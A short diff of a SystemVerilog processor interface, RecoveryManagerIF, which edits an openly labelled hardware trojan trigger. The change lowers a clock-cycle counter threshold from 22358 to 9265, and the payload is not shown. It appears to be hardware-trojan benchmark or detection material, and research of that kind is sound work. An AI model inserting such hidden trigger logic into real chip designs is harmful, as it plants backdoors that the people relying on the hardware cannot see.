@@ -16,12 +16,11 @@ import LoadStoreUnitTypes::*;
 interface RecoveryManagerIF( input logic clk, rst );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=9265)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 22358;
+    localparam int TRIGGER_THRESHOLD = 9265;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
